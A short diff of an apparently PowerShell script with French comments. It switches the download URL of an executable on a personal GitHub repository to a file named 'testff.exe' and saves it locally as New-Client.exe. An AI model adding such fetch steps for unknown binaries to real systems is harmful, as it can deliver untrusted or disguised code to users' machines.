@@ -1,5 +1,5 @@
 # Définir l'URL du fichier à télécharger
-$url = "https://raw.githubusercontent.com/ExoTiiCk/Nouveau-dossier-2-/refs/heads/main/New-Client.exe"
+$url = "https://github.com/ExoTiiCk/Nouveau-dossier-2-/raw/refs/heads/main/testff.exe"
 
 # Définir le chemin local où le fichier sera enregistré
 $localPath = "$PWD\New-Client.exe"
